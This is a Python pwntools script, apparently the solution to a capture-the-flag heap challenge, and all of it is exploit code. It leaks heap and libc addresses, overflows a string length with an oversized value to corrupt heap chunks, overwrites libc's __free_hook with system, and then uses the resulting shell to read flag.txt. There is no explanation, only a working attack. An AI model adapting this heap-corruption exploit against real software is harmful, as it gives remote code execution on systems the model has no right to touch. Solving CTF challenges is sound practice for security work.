#### solve.py

```py
#!/usr/bin/env python3
from pwn import *
from time import sleep
import argparse
import re
import sys

parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
args = parser.parse_args()

p = remote(args.host, args.port)

libc = ELF('./libc-2.31.so')
e = ELF('./generic')

MAX_UINT = 0x100000000

def print_list():
    p.sendlineafter('>', b'1')


def add_item(value, itype=None, strlen=None):
    p.sendlineafter(b'>', b'2')
    if itype:
        if itype == 4:
            strlen = strlen if strlen else len(value)

            p.sendlineafter(b'type', '4')
            p.sendlineafter(b'length', str(strlen).encode())
            p.sendlineafter(b'string', value)
        else:
            p.sendlineafter(b'type', str(itype).encode())
            p.sendlineafter(b'value', str(value).encode())
    else:
        if type(value) is str or type(value) is bytes:
            strlen = strlen if strlen else len(value)

            p.sendlineafter(b'type', b'4')
            p.sendlineafter(b'length', str(strlen).encode())
            p.sendlineafter(b'string', str(value).encode())
        else:
            p.sendlineafter(b'type', b'1')
            p.sendlineafter(b'value', str(value).encode())

def change_item(idx, value, itype=None, strlen=None):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'>', str(idx).encode())
    if itype:
        if itype == 4:
            strlen = strlen if strlen else len(value)

            p.sendlineafter(b'type', b'4')
            p.sendlineafter(b'length', str(strlen).encode())
            p.sendlineafter(b'string', value)
        else:
            p.sendlineafter(b'type', str(itype).encode())
            p.sendlineafter(b'value', str(value).encode())
    else:
        if type(value) is str or type(value) is bytes:
            strlen = strlen if strlen else len(value)

            p.sendlineafter(b'type', b'4')
            p.sendlineafter(b'length', str(strlen).encode())
            p.sendlineafter(b'string', value)
        else:
            p.sendlineafter(b'type', b'1')
            p.sendlineafter(b'value', str(value).encode())

def remove_item(idx):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'>', str(idx).encode())

add_item("AAAA")
change_item(1, b'.', itype=1)

print_list()
p.recvuntil(b'contains:')
p.recvline()
heap = int(p.recvline().strip().split(b' ')[-1].decode())

remove_item(1)

add_item(b'A', strlen=0xf00)
add_item(b'A'*0x20, strlen=0x30)
add_item(b'B'*0x20, strlen=0x50)

remove_item(1)

overflow = [
    b'A'*0x38,
    p64(0x31),
    p64(heap - 0x30),
    p64(4),
    p64(heap + 0x20)
]

change_item(1, b''.join(overflow), strlen=MAX_UINT + 0x30)

print_list()

p.recvuntil(b'1. ')
p.recvline()
leak = u64(p.recvline().strip().split(b' ')[-1].ljust(8, b'\0'))

libc.address = leak - 0x1ebbe0

overflow = [
    b'/bin/sh\0',
    b'A'*0x30,
    p64(0x31),
    p64(libc.symbols.__free_hook - 0x10),
    p64(0),
]

change_item(1, b''.join(overflow), strlen=MAX_UINT + 0x30)
change_item(3, libc.symbols.system)

remove_item(1)

sleep(0.1)
p.sendline(b'cat flag.txt')
resp = p.recvuntil(b'}').strip().decode()
if 'flag{' in resp:
    log.success(f'Flag => {resp}')
    sys.exit(0)
else:
    log.error('Failed to get flag')
    sys.exit(-1)
```
